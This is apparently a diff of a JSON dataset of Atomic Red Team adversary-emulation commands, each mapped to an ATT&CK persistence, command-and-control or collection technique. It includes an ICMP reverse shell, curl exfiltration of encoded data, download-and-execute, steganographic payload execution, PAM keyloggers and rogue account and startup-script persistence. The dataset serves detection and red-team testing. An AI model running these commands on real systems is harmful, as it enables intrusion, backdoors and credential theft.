+"test_name": "Active Directory Create Admin Account"
+},
+{
+"command": "echo \"dn: cn=Atomic User, cn=Users,dc=#{domain},dc=#{top_level_domain}\\nobjectClass: person\\ncn: Atomic User\\nsn: User\" > tempadmin.ldif && echo ldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif && ldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif",
+"row_index": 169,
+"sandbox": "1773600497_T1136.002_5_169",
+"tactic": "persistence",
+"technique": "T1136.002",
+"test": "5",
+"test_name": "Active Directory Create User Account (Non-elevated)"
+},
+{
+"command": "sudo insmod #{module_path}",
+"row_index": 170,
+"sandbox": "1773600617_T1547.006_1_170",
+"tactic": "persistence",
+"technique": "T1547.006",
+"test": "1",
+"test_name": "Linux - Load Kernel Module via insmod"
+},
+{
+"command": "echo \"[Unit]\" > #{path_to_systemd_service} && echo \"Description=Atomic Red Team Systemd Timer Service\" >> #{path_to_systemd_service} && echo \"[Service]\" >> #{path_to_systemd_service} && echo \"Type=simple\" >> #{path_to_systemd_service} && echo \"ExecStart=/bin/touch /tmp/art-systemd-timer-marker\" >> #{path_to_systemd_service} && echo \"[Install]\" >> #{path_to_systemd_service} && echo \"WantedBy=multi-user.target\" >> #{path_to_systemd_service} && echo \"[Unit]\" > #{path_to_systemd_timer} && echo \"Description=Executes Atomic Red Team Systemd Timer Service\" >> #{path_to_systemd_timer} && echo \"Requires=#{systemd_service_name}\" >> #{path_to_systemd_timer} && echo \"[Timer]\" >> #{path_to_systemd_timer} && echo \"Unit=#{systemd_service_name}\" >> #{path_to_systemd_timer} && echo \"OnCalendar=*-*-* *:*:00\" >> #{path_to_systemd_timer} && echo \"[Install]\" >> #{path_to_systemd_timer} && echo \"WantedBy=timers.target\" >> #{path_to_systemd_timer} && systemctl start #{systemd_timer_name} && systemctl enable #{systemd_timer_name} && systemctl daemon-reload",
+"row_index": 171,
+"sandbox": "1773600737_T1053.006_1_171",
+"tactic": "persistence",
+"technique": "T1053.006",
+"test": "1",
+"test_name": "Create Systemd Service and Timer"
+},
+{
+"command": "systemd-run --user --unit=Atomic-Red-Team --on-calendar '*:0/1' /bin/sh -c 'echo \"$(date) $(whoami)\" >>/tmp/log'",
+"row_index": 172,
+"sandbox": "1773600857_T1053.006_2_172",
+"tactic": "persistence",
+"technique": "T1053.006",
+"test": "2",
+"test_name": "Create a user level transient systemd service and timer"
+},
+{
+"command": "systemd-run --unit=Atomic-Red-Team --on-calendar '*:0/1' /bin/sh -c 'echo \"$(date) $(whoami)\" >>/tmp/log'",
+"row_index": 173,
+"sandbox": "1773600977_T1053.006_3_173",
+"tactic": "persistence",
+"technique": "T1053.006",
+"test": "3",
+"test_name": "Create a system level transient systemd service and timer"
+},
+{
+"command": "echo '#{command_to_add}' >> ~/.bash_profile",
+"row_index": 174,
+"sandbox": "1773601097_T1546.004_1_174",
+"tactic": "persistence",
+"technique": "T1546.004",
+"test": "1",
+"test_name": "Add command to .bash_profile"
+},
+{
+"command": "echo '#{command_to_add}' >> ~/.bashrc",
+"row_index": 175,
+"sandbox": "1773601217_T1546.004_2_175",
+"tactic": "persistence",
+"technique": "T1546.004",
+"test": "2",
+"test_name": "Add command to .bashrc"
+},
+{
+"command": "echo '#{command_to_add}' >> ~/.shrc",
+"row_index": 176,
+"sandbox": "1773601337_T1546.004_3_176",
+"tactic": "persistence",
+"technique": "T1546.004",
+"test": "3",
+"test_name": "Add command to .shrc"
+},
+{
+"command": "echo '#{text_to_append}' >> /etc/profile",
+"row_index": 177,
+"sandbox": "1773601457_T1546.004_4_177",
+"tactic": "persistence",
+"technique": "T1546.004",
+"test": "4",
+"test_name": "Append to the system shell profile"
+},
+{
+"command": "echo '#{text_to_append}' >> ~/.profile",
+"row_index": 178,
+"sandbox": "1773601578_T1546.004_5_178",
+"tactic": "persistence",
+"technique": "T1546.004",
+"test": "5",
+"test_name": "Append commands user shell profile"
+},
+{
+"command": "echo '#{text_to_append}' >> /etc/profile.d/bash_completion.sh",
+"row_index": 179,
+"sandbox": "1773601698_T1546.004_6_179",
+"tactic": "persistence",
+"technique": "T1546.004",
+"test": "6",
+"test_name": "System shell profile scripts"
+},
+{
+"command": "useradd --create-home --shell /bin/bash art && su -l art -c \"echo 'echo \\\"Atomic Red Team was here... T1546.004\\\" >> /home/art/art.txt' >> /home/art/.bash_logout; exit\"",
+"row_index": 180,
+"sandbox": "1773601818_T1546.004_7_180",
+"tactic": "persistence",
+"technique": "T1546.004",
+"test": "7",
+"test_name": "Create/Append to .bash_logout"
+},
+{
+"command": "TEMPDIR=\"/tmp/atomic_sitecust_posix\" && mkdir -p \"$TEMPDIR\" && \"#{python_exe}\" -m venv \"$TEMPDIR/env\" && SITE_PACKAGES=$(\"$TEMPDIR/env/bin/#{python_exe}\" -c \"import site; print(site.getsitepackages()[0])\") && echo \"import os; os.system('cat /etc/passwd 1> /tmp/atomic_hook_poc.txt')\" > \"$SITE_PACKAGES/atomic_hook.pth\" && ls -la \"$SITE_PACKAGES/atomic_hook.pth\" && \"$TEMPDIR/env/bin/python\" -c \"print('Triggering Hook via atomic_hook...')\" && if [ -f /tmp/atomic_hook_poc.txt ]; then echo \"[+] Success: atomic_hook_poc.txt created under /tmp \\n\" $(ls -la /tmp/ | grep -w atomic_hook_poc.txt); else echo \"Failed: /tmp/atomic_hook_poc.txt not found\"; fi",
+"row_index": 181,
+"sandbox": "1773601938_T1546.018_3_181",
+"tactic": "persistence",
+"technique": "T1546.018",
+"test": "3",
+"test_name": "Python Startup Hook - atomic_hook.pth (Linux)"
+},
+{
+"command": "PYTHON_EXE=$(command -v #{python_exe} || command -v python) && USER_PACKAGES=$($PYTHON_EXE -c \"import site; print(site.getusersitepackages())\") && mkdir -p \"$USER_PACKAGES\" && echo \"import os; os.system('date > /tmp/poc.txt')\" > \"$USER_PACKAGES/usercustomize.py\" && if [ -f \"$USER_PACKAGES/usercustomize.py\" ]; then echo \"Success: usercustomize.py created under $USER_PACKAGES\\n\" $(ls -la \"$USER_PACKAGES\" | grep usercustomize*); else echo \"Failed: usercustomize.py not found under $USER_PACKAGES\"; fi && $PYTHON_EXE -c \"print('Triggering Hook via usercustomize.py...')\" && if [ -f /tmp/poc.txt ]; then echo \"Success: poc.txt created under /tmp\\n\" $(ls -la /tmp/ | grep -w poc.txt); else echo \"Failed: /tmp/poc.txt not found\"; fi",
+"row_index": 182,
+"sandbox": "1773602058_T1546.018_5_182",
+"tactic": "persistence",
+"technique": "T1546.018",
+"test": "5",
+"test_name": "Python Startup Hook - usercustomize.py (Linux / MacOS)"
+},
+{
+"command": "filename='/etc/rc.common';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.common.original;fi && printf '%s\\n' '#!/bin/bash' | sudo tee /etc/rc.common && echo \"python3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMuY29tbW9uID4gL3RtcC9UMTAzNy4wMDQucmMuY29tbW9uJykK'))\\\"\" | sudo tee -a /etc/rc.common && printf '%s\\n' 'exit 0' | sudo tee -a /etc/rc.common && sudo chmod +x /etc/rc.common",
+"row_index": 183,
+"sandbox": "1773602178_T1037.004_2_183",
+"tactic": "persistence",
+"technique": "T1037.004",
+"test": "2",
+"test_name": "rc.common"
+},
+{
+"command": "filename='/etc/rc.local';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.local.original;fi && [ \"$(uname)\" = 'FreeBSD' ] && alias python3=python3.9 && printf '#\\!/usr/local/bin/bash' | sudo tee /etc/rc.local || printf '#!/bin/bash' | sudo tee /etc/rc.local && echo \"\\npython3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMubG9jYWwgPiAvdG1wL1QxMDM3LjAwNC5yYy5sb2NhbCcpCgo='))\\\"\" | sudo tee -a /etc/rc.local && printf 'exit 0' | sudo tee -a /etc/rc.local && sudo chmod +x /etc/rc.local",
+"row_index": 184,
+"sandbox": "1773602298_T1037.004_3_184",
+"tactic": "persistence",
+"technique": "T1037.004",
+"test": "3",
+"test_name": "rc.local"
+},
+{
+"command": "echo \"[Unit]\" > #{systemd_service_path}/#{systemd_service_file} && echo \"Description=Atomic Red Team Systemd Service\" >> #{systemd_service_path}/#{systemd_service_file} && echo \"\" >> #{systemd_service_path}/#{systemd_service_file} && echo \"[Service]\" >> #{systemd_service_path}/#{systemd_service_file} && echo \"Type=simple\" && echo \"ExecStart=#{execstart_action}\" >> #{systemd_service_path}/#{systemd_service_file} && echo \"ExecStartPre=#{execstartpre_action}\" >> #{systemd_service_path}/#{systemd_service_file} && echo \"ExecStartPost=#{execstartpost_action}\" >> #{systemd_service_path}/#{systemd_service_file} && echo \"ExecReload=#{execreload_action}\" >> #{systemd_service_path}/#{systemd_service_file} && echo \"ExecStop=#{execstop_action}\" >> #{systemd_service_path}/#{systemd_service_file} && echo \"ExecStopPost=#{execstoppost_action}\" >> #{systemd_service_path}/#{systemd_service_file} && echo \"\" >> #{systemd_service_path}/#{systemd_service_file} && echo \"[Install]\" >> #{systemd_service_path}/#{systemd_service_file} && echo \"WantedBy=default.target\" >> #{systemd_service_path}/#{systemd_service_file} && systemctl daemon-reload && systemctl enable #{systemd_service_file} && systemctl start #{systemd_service_file}",
+"row_index": 185,
+"sandbox": "1773602418_T1543.002_1_185",
+"tactic": "persistence",
+"technique": "T1543.002",
+"test": "1",
+"test_name": "Create Systemd Service"
+},
+{
+"command": "echo '#\\!/bin/sh' > #{rc_service_path}/#{rc_service_file} && echo ' ' >> #{rc_service_path}/#{rc_service_file} && echo '#' >> #{rc_service_path}/#{rc_service_file} && echo '# PROVIDE: art-test' >> #{rc_service_path}/#{rc_service_file} && echo '# REQUIRE: LOGIN' >> #{rc_service_path}/#{rc_service_file} && echo '# KEYWORD: shutdown' >> #{rc_service_path}/#{rc_service_file} && echo ' ' >> #{rc_service_path}/#{rc_service_file} && echo '. /etc/rc.subr' >> #{rc_service_path}/#{rc_service_file} && echo ' ' >> #{rc_service_path}/#{rc_service_file} && echo 'name=\"art_test\"' >> #{rc_service_path}/#{rc_service_file} && echo 'rcvar=art_test_enable' >> #{rc_service_path}/#{rc_service_file} && echo 'load_rc_config ${name}' >> #{rc_service_path}/#{rc_service_file} && echo 'command=\"/usr/bin/touch\"' >> #{rc_service_path}/#{rc_service_file} && echo 'start_cmd=\"art_test_start\"' >> #{rc_service_path}/#{rc_service_file} && echo '' >> #{rc_service_path}/#{rc_service_file} && echo 'art_test_start()' >> #{rc_service_path}/#{rc_service_file} && echo '{' >> #{rc_service_path}/#{rc_service_file} && echo '  ${command} /tmp/art-test.marker' >> #{rc_service_path}/#{rc_service_file} && echo '}' >> #{rc_service_path}/#{rc_service_file} && echo ' ' >> #{rc_service_path}/#{rc_service_file} && echo 'run_rc_command \"$1\"' >> #{rc_service_path}/#{rc_service_file} && chmod +x #{rc_service_path}/#{rc_service_file} && service art-test enable && service art-test start",
+"row_index": 186,
+"sandbox": "1773602538_T1543.002_2_186",
+"tactic": "persistence",
+"technique": "T1543.002",
+"test": "2",
+"test_name": "Create SysV Service"
+},
+{
+"command": "echo \"#!/bin/bash\" > /etc/init.d/T1543.002 && echo \"### BEGIN INIT INFO\" >> /etc/init.d/T1543.002 && echo \"# Provides : Atomic Test T1543.002\" >> /etc/init.d/T1543.002 && echo \"# Required-Start: \\$all\" >> /etc/init.d/T1543.002 && echo \"# Required-Stop : \" >> /etc/init.d/T1543.002 && echo \"# Default-Start: 2 3 4 5\" >> /etc/init.d/T1543.002 && echo \"# Default-Stop: \" >> /etc/init.d/T1543.002 && echo \"# Short Description: Atomic Test for Systemd Service Creation\" >> /etc/init.d/T1543.002 && echo \"### END INIT INFO\" >> /etc/init.d/T1543.002 && echo \"python3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBDcmVhdGluZyBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLmNyZWF0aW9uJykK')) \\\" \" >> /etc/init.d/T1543.002 && chmod +x /etc/init.d/T1543.002 && if [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ]; then update-rc.d T1543.002 defaults; elif [ $(cat /etc/os-release | grep -i 'ID=\"centos\"') ]; then chkconfig T1543.002 on ; else echo \"Please run this test on Ubnutu , kali OR centos\" ; fi && systemctl enable T1543.002 && systemctl start T1543.002 && echo \"python3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgYSBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLm1vZGlmaWNhdGlvbicpCg=='))\\\"\" | sudo tee -a /etc/init.d/T1543.002 && systemctl daemon-reload && systemctl restart T1543.002",
+"row_index": 187,
+"sandbox": "1773602658_T1543.002_3_187",
+"tactic": "persistence",
+"technique": "T1543.002",
+"test": "3",
+"test_name": "Create Systemd Service file,  Enable the service , Modify and Reload the service."
+},
+{
+"command": "echo \"#{at_command}\" | at #{time_spec}",
+"row_index": 188,
+"sandbox": "1773602779_T1053.002_2_188",
+"tactic": "persistence",
+"technique": "T1053.002",
+"test": "2",
+"test_name": "At - Schedule a job"
+},
+{
+"command": "password=$(openssl passwd -1 art) && ([ \"$(uname)\" = 'Linux' ] && useradd --shell /bin/bash --create-home --password $password art) || (pw useradd art -g wheel -s /bin/sh && (echo $password | pw mod user testuser1 -h 0)) && su art -c \"whoami; exit\"",
+"row_index": 189,
+"sandbox": "1773602899_T1078.003_8_189",
+"tactic": "persistence",
+"technique": "T1078.003",
+"test": "8",
+"test_name": "Create local account (Linux)"
+},
+{
+"command": "useradd --shell /bin/bash --create-home --password $(openssl passwd -1 art) art && usermod --lock art && usermod --expiredate \"1\" art && usermod --unlock art && usermod --expiredate \"99999\" art && su -c whoami art",
+"row_index": 190,
+"sandbox": "1773603019_T1078.003_9_190",
+"tactic": "persistence",
+"technique": "T1078.003",
+"test": "9",
+"test_name": "Reactivate a locked/expired account (Linux)"
+},
+{
+"command": "pw useradd art -g wheel -s /bin/sh && echo $(openssl passwd -1 art) | pw mod user testuser1 -h 0 && pw lock art && pw usermod art -e +1d && pw unlock art && pw user mod art -e +99d && su art && whoami && exit",
+"row_index": 191,
+"sandbox": "1773603139_T1078.003_10_191",
+"tactic": "persistence",
+"technique": "T1078.003",
+"test": "10",
+"test_name": "Reactivate a locked/expired account (FreeBSD)"
+},
+{
+"command": "cat /etc/passwd |grep nobody && chsh --shell /bin/bash nobody && usermod --password $(openssl passwd -1 nobody) nobody && su -c \"whoami\" nobody",
+"row_index": 192,
+"sandbox": "1773603259_T1078.003_11_192",
+"tactic": "persistence",
+"technique": "T1078.003",
+"test": "11",
+"test_name": "Login as nobody (Linux)"
+},
+{
+"command": "cat /etc/passwd |grep nobody && pw usermod nobody -s /bin/sh && echo $(openssl passwd -1 art) | pw mod user nobody -h 0 && su nobody && whoami && exit",
+"row_index": 193,
+"sandbox": "1773603379_T1078.003_12_193",
+"tactic": "persistence",
+"technique": "T1078.003",
+"test": "12",
+"test_name": "Login as nobody (freebsd)"
+},
+{
+"command": "echo -n 111-11-1111 | base64 && curl -XPOST #{base64_data}.#{destination_url}",
+"row_index": 194,
+"sandbox": "1773603499_T1132.001_1_194",
+"tactic": "command-and-control",
+"technique": "T1132.001",
+"test": "1",
+"test_name": "Base64 Encoded data."
+},
+{
+"command": "echo -n 111-11-1111 | b64encode -r - && curl -XPOST #{base64_data}.#{destination_url}",
+"row_index": 195,
+"sandbox": "1773603619_T1132.001_2_195",
+"tactic": "command-and-control",
+"technique": "T1132.001",
+"test": "2",
+"test_name": "Base64 Encoded data (freebsd)"
+},
+{
+"command": "#{binary_path} host -p #{port} &",
+"row_index": 196,
+"sandbox": "1773603739_T1572_5_196",
+"tactic": "command-and-control",
+"technique": "T1572",
+"test": "5",
+"test_name": "Microsoft Dev tunnels (Linux/macOS)"
+},
+{
+"command": "nohup code tunnel --accept-server-license-terms #{additional_args} >/dev/null 2>&1 &",
+"row_index": 197,
+"sandbox": "1773603859_T1572_6_197",
+"tactic": "command-and-control",
+"technique": "T1572",
+"test": "6",
+"test_name": "VSCode tunnels (Linux/macOS)"
+},
+{
+"command": "nohup #{binary_path} tunnel --url #{url_to_tunnel} #{additional_args} >/dev/null 2>&1 &",
+"row_index": 198,
+"sandbox": "1773603980_T1572_7_198",
+"tactic": "command-and-control",
+"technique": "T1572",
+"test": "7",
+"test_name": "Cloudflare tunnels (Linux/macOS)"
+},
+{
+"command": "[ \"$(uname)\" = 'FreeBSD' ] && sysrc tor_enable=\"YES\" && service tor start || sudo systemctl start tor",
+"row_index": 199,
+"sandbox": "1773604100_T1090.003_3_199",
+"tactic": "command-and-control",
+"technique": "T1090.003",
+"test": "3",
+"test_name": "Tor Proxy Usage - Debian/Ubuntu/FreeBSD"
+},
+{
+"command": "echo quit | telnet #{domain} #{port} && exit 0",
+"row_index": 200,
+"sandbox": "1773604220_T1571_2_200",
+"tactic": "command-and-control",
+"technique": "T1571",
+"test": "2",
+"test_name": "Testing usage of uncommonly used port"
+},
+{
+"command": "1. Run the following command on both the attacker and victim machines to download the required binaries. && mkdir -p /tmp/icmpdoor && wget -P /tmp/icmpdoor https://github.com/krabelize/icmpdoor/raw/2398f7e0b8548d8ef2891089e4199ee630e84ef6/binaries/x86_64-linux/icmp-cnc https://github.com/krabelize/icmpdoor/raw/2398f7e0b8548d8ef2891089e4199ee630e84ef6/binaries/x86_64-linux/icmpdoor && chmod +x /tmp/icmpdoor/icmp-cnc /tmp/icmpdoor/icmpdoor && echo 'export PATH=$PATH:/tmp/icmpdoor' >> ~/.bashrc && source ~/.bashrc && 2. Start the C2 server on the attacker system to listen for incoming connections. && icmp-cnc --interface <Network Interface> --destination_ip <VICTIM-IP> && 3. Run the client on the victim machine. && icmpdoor --interface <Network Interface> --destination_ip <ATTACKER-IP> && 4. Cleanup Command: Remove the icmpdoor directory. && rm -rf /tmp/icmpdoor",
+"row_index": 201,
+"sandbox": "1773604340_T1095_4_201",
+"tactic": "command-and-control",
+"technique": "T1095",
+"test": "4",
+"test_name": "Linux ICMP Reverse Shell using icmp-cnc"
+},
+{
+"command": "curl -s -A \"HttpBrowser/1.0\" -m3 #{domain} && curl -s -A \"Wget/1.9+cvs-stable (Red Hat modified)\" -m3 #{domain} && curl -s -A \"Opera/8.81 (Windows NT 6.0; U; en)\" -m3 #{domain} && curl -s -A \"*<|>*\" -m3 #{domain}",
+"row_index": 202,
+"sandbox": "1773604460_T1071.001_3_202",
+"tactic": "command-and-control",
+"technique": "T1071.001",
+"test": "3",
+"test_name": "Malicious User Agents - Nix"
+},
+{
+"command": "rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}",
+"row_index": 203,
+"sandbox": "1773604580_T1105_1_203",
+"tactic": "command-and-control",
+"technique": "T1105",
+"test": "1",
+"test_name": "rsync remote file copy (push)"
+},
+{
+"command": "rsync -r #{username}@#{remote_host}:#{remote_path} #{local_path}",
+"row_index": 204,
+"sandbox": "1773604700_T1105_2_204",
+"tactic": "command-and-control",
+"technique": "T1105",
+"test": "2",
+"test_name": "rsync remote file copy (pull)"
+},
+{
+"command": "scp #{local_file} #{username}@#{remote_host}:#{remote_path}",
+"row_index": 205,
+"sandbox": "1773604820_T1105_3_205",
+"tactic": "command-and-control",
+"technique": "T1105",
+"test": "3",
+"test_name": "scp remote file copy (push)"
+},
+{
+"command": "scp #{username}@#{remote_host}:#{remote_file} #{local_path}",
+"row_index": 206,
+"sandbox": "1773604940_T1105_4_206",
+"tactic": "command-and-control",
+"technique": "T1105",
+"test": "4",
+"test_name": "scp remote file copy (pull)"
+},
+{
+"command": "sftp #{username}@#{remote_host}:#{remote_path} <<< $'put #{local_file}'",
+"row_index": 207,
+"sandbox": "1773605060_T1105_5_207",
+"tactic": "command-and-control",
+"technique": "T1105",
+"test": "5",
+"test_name": "sftp remote file copy (push)"
+},
+{
+"command": "sftp #{username}@#{remote_host}:#{remote_file} #{local_path}",
+"row_index": 208,
+"sandbox": "1773605181_T1105_6_208",
+"tactic": "command-and-control",
+"technique": "T1105",
+"test": "6",
+"test_name": "sftp remote file copy (pull)"
+},
+{
+"command": "timeout --preserve-status #{timeout} whois -h #{remote_host} -p #{remote_port} \"#{query}\" > #{output_file}",
+"row_index": 209,
+"sandbox": "1773605301_T1105_14_209",
+"tactic": "command-and-control",
+"technique": "T1105",
+"test": "14",
+"test_name": "whois file download"
+},
+{
+"command": "curl -sO #{remote_url}; chmod +x #{payload_name} | bash #{payload_name}",
+"row_index": 210,
+"sandbox": "1773605421_T1105_27_210",
+"tactic": "command-and-control",
+"technique": "T1105",
+"test": "27",
+"test_name": "Linux Download File and Run"
+},
+{
+"command": "cat \"#{script}\" | base64 | xxd -p | sed 's/../& /g' | xargs -n1 | xxd -r -p | cat \"#{image}\" - > \"#{evil_image}\"; strings \"#{evil_image}\" | tail -n 1 | base64 -d | sh",
+"row_index": 211,
+"sandbox": "1773605541_T1001.002_3_211",
+"tactic": "command-and-control",
+"technique": "T1001.002",
+"test": "3",
+"test_name": "Execute Embedded Script in Image via Steganography"
+},
+{
+"command": "export #{proxy_scheme}_proxy=#{proxy_server}:#{proxy_port} && curl #{test_url}",
+"row_index": 212,
+"sandbox": "1773605661_T1090.001_1_212",
+"tactic": "command-and-control",
+"technique": "T1090.001",
+"test": "1",
+"test_name": "Connection Proxy"
+},
+{
+"command": "zip #{output_file} #{input_files}",
+"row_index": 213,
+"sandbox": "1773605781_T1560.001_5_213",
+"tactic": "collection",
+"technique": "T1560.001",
+"test": "5",
+"test_name": "Data Compressed - nix - zip"
+},
+{
+"command": "test -e #{input_file} && gzip -k #{input_file} || (echo '#{input_content}' >> #{input_file}; gzip -k #{input_file})",
+"row_index": 214,
+"sandbox": "1773605901_T1560.001_6_214",
+"tactic": "collection",
+"technique": "T1560.001",
+"test": "6",
+"test_name": "Data Compressed - nix - gzip Single File"
+},
+{
+"command": "tar -cvzf #{output_file} #{input_file_folder}",
+"row_index": 215,
+"sandbox": "1773606021_T1560.001_7_215",
+"tactic": "collection",
+"technique": "T1560.001",
+"test": "7",
+"test_name": "Data Compressed - nix - tar Folder or File"
+},
+{
+"command": "mkdir -p #{test_folder} && cd #{test_folder}; touch a b c d e f g && zip --password \"#{encryption_password}\" #{test_folder}/#{test_file} ./* && echo \"#{encryption_password}\" | gpg --batch --yes --passphrase-fd 0 --output #{test_folder}/#{test_file}.zip.gpg -c #{test_folder}/#{test_file}.zip && ls -l #{test_folder}",
+"row_index": 216,
+"sandbox": "1773606141_T1560.001_8_216",
+"tactic": "collection",
+"technique": "T1560.001",
+"test": "8",
+"test_name": "Data Encrypted with zip and gpg symmetric"
+},
+{
+"command": "zip -r  #{input_folder}/#{input_file}.zip #{input_folder} && openssl enc -aes-256-cbc -pass pass:#{enc_pass} -p -in #{input_folder}/#{input_file}.zip -out #{input_folder}/#{input_file}.enc && cat #{input_folder}/#{input_file}.enc | base64",
+"row_index": 217,
+"sandbox": "1773606261_T1560.001_9_217",
+"tactic": "collection",
+"technique": "T1560.001",
+"test": "9",
+"test_name": "Encrypts collected data with AES-256 and Base64"
+},
+{
+"command": "xwd -root -out #{output_file} && xwud -in #{output_file}",
+"row_index": 218,
+"sandbox": "1773606382_T1113_3_218",
+"tactic": "collection",
+"technique": "T1113",
+"test": "3",
+"test_name": "X Windows Capture"
+},
+{
+"command": "xwd -root -out #{output_file} && xwud -in #{output_file}",
+"row_index": 219,
+"sandbox": "1773606502_T1113_4_219",
+"tactic": "collection",
+"technique": "T1113",
+"test": "4",
+"test_name": "X Windows Capture (freebsd)"
+},
+{
+"command": "import -window root #{output_file}",
+"row_index": 220,
+"sandbox": "1773606622_T1113_5_220",
+"tactic": "collection",
+"technique": "T1113",
+"test": "5",
+"test_name": "Capture Linux Desktop using Import Tool"
+},
+{
+"command": "import -window root #{output_file}",
+"row_index": 221,
+"sandbox": "1773606742_T1113_6_221",
+"tactic": "collection",
+"technique": "T1113",
+"test": "6",
+"test_name": "Capture Linux Desktop using Import Tool (freebsd)"
+},
+{
+"command": "if sudo test -f /etc/pam.d/password-auth; then sudo cp /etc/pam.d/password-auth /tmp/password-auth.bk; fi; && if sudo test -f /etc/pam.d/system-auth; then sudo cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi; && sudo touch /tmp/password-auth.bk && sudo touch /tmp/system-auth.bk sudo echo \"session    required    pam_tty_audit.so && enable=* log_password\" >> /etc/pam.d/password-auth sudo echo \"session    required    pam_tty_audit.so && enable=* log_password\" >> /etc/pam.d/system-auth",
+"row_index": 222,
+"sandbox": "1773606862_T1056.001_2_222",
+"tactic": "collection",
+"technique": "T1056.001",
+"test": "2",
+"test_name": "Living off the land Terminal Input Capture on Linux with pam.d"
+},
+{
+"command": "PROMPT_COMMAND='history -a >(tee -a ~/.bash_history |logger -t \"$USER[$$] $SSH_CONNECTION \")' && echo \"\\$PROMPT_COMMAND=$PROMPT_COMMAND\" && tail /var/log/syslog",
+"row_index": 223,
+"sandbox": "1773606982_T1056.001_3_223",
+"tactic": "collection",
+"technique": "T1056.001",
+"test": "3",
+"test_name": "Logging bash history to syslog"
+},
+{
+"command": "PS2=`logger -t \"$USER\" -f ~/.sh_history` && $PS2 && tail /var/log/messages",
+"row_index": 224,
+"sandbox": "1773607102_T1056.001_4_224",
+"tactic": "collection",
+"technique": "T1056.001",
+"test": "4",
+"test_name": "Logging sh history to syslog/messages"
+},
+{
+"command": "trap 'echo \"$(date +\"%d/%m/%y %H:%M:%S.%s\") $USER $BASH_COMMAND\" >> #{output_file}' DEBUG && echo \"Hello World!\" && cat #{output_file}",
+"row_index": 225,
+"sandbox": "1773607222_T1056.001_5_225",
+"tactic": "collection",
+"technique": "T1056.001",
+"test": "5",
+"test_name": "Bash session based keylogger"
+},
+{
+"command": "cp -v /etc/pam.d/sshd /tmp/ && echo \"session required pam_tty_audit.so disable=* enable=* open_only log_passwd\" >> /etc/pam.d/sshd && systemctl restart sshd && systemctl restart auditd && ssh #{user_account}@localhost && whoami && sudo su && whoami && exit && exit",
+"row_index": 226,
+"sandbox": "1773607342_T1056.001_6_226",
+"tactic": "collection",
+"technique": "T1056.001",
+"test": "6",
+"test_name": "SSHD PAM keylogger"
+},
+{
+"command": "auditctl -a always,exit -F arch=b64 -S execve -k CMDS && auditctl -a always,exit -F arch=b32 -S execve -k CMDS && whoami; ausearch -i --start now",
+"row_index": 227,
+"sandbox": "1773607463_T1056.001_7_227",
+"tactic": "collection",
+"technique": "T1056.001",
+"test": "7",
+"test_name": "Auditd keylogger"
+},
+{
+"command": "curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh | sh -s > #{output_file}",
+"row_index": 228,
+"sandbox": "1773607583_T1074.001_2_228",
+"tactic": "collection",
+"technique": "T1074.001",
+"test": "2",
+"test_name": "Stage data from Discovery.sh"
+},
+{
+"command": "apt install xclip -y && history | tail -n 30 | xclip -sel clip && xclip -o > history.txt",
+"row_index": 229,
+"sandbox": "1773607703_T1115_5_229",
+"tactic": "collection",
+"technique": "T1115",
+"test": "5",
+"test_name": "Add or copy content to clipboard with xClip"
+},
+{
+"command": "cd $HOME && curl -O #{remote_url}/art && curl -O #{remote_url}/gta.db && curl -O #{remote_url}/sqlite_dump.sh && chmod +x sqlite_dump.sh && find . ! -executable -exec bash -c 'if [[ \"$(head -c 15 {} | strings)\" == \"SQLite format 3\" ]]; then echo \"{}\"; ./sqlite_dump.sh {}; fi' \\;",
+"row_index": 230,
+"sandbox": "1773607823_T1005_2_230",
+"tactic": "collection",
+"technique": "T1005",
+"test": "2",
+"test_name": "Find and dump sqlite databases (Linux)"
+},
+{
+"command": "which_python=`which python || which python3` && $which_python -c \"import gzip;input_file=open('#{path_to_input_file}', 'rb');content=input_file.read();input_file.close();output_file=gzip.GzipFile('#{path_to_output_file}','wb',compresslevel=6);output_file.write(content);output_file.close();\"",
+"row_index": 231,
+"sandbox": "1773607943_T1560.002_1_231",
+"tactic": "collection",
+"technique": "T1560.002",
+"test": "1",
+"test_name": "Compressing data using GZip in Python (FreeBSD/Linux)"
+},
+{
+"command": "which_python=`which python || which python3` && $which_python -c \"import bz2;input_file=open('#{path_to_input_file}','rb');content=input_file.read();input_file.close();bz2content=bz2.compress(content,compresslevel=9);output_file=open('#{path_to_output_file}','w+');output_file.write(str(bz2content));output_file.close();\"",
+"row_index": 232,
+"sandbox": "1773608063_T1560.002_2_232",
+"tactic": "collection",
+"technique": "T1560.002",
+"test": "2",
+"test_name": "Compressing data using bz2 in Python (FreeBSD/Linux)"
+},
+{
+"command": "which_python=`which python || which python3` && $which_python -c \"from zipfile import ZipFile; ZipFile('#{path_to_output_file}', mode='w').write('#{path_to_input_file}')\"",
+"row_index": 233,
+"sandbox": "1773608183_T1560.002_3_233",
+"tactic": "collection",
+"technique": "T1560.002",
+"test": "3",
+"test_name": "Compressing data using zipfile in Python (FreeBSD/Linux)"
+},
+{
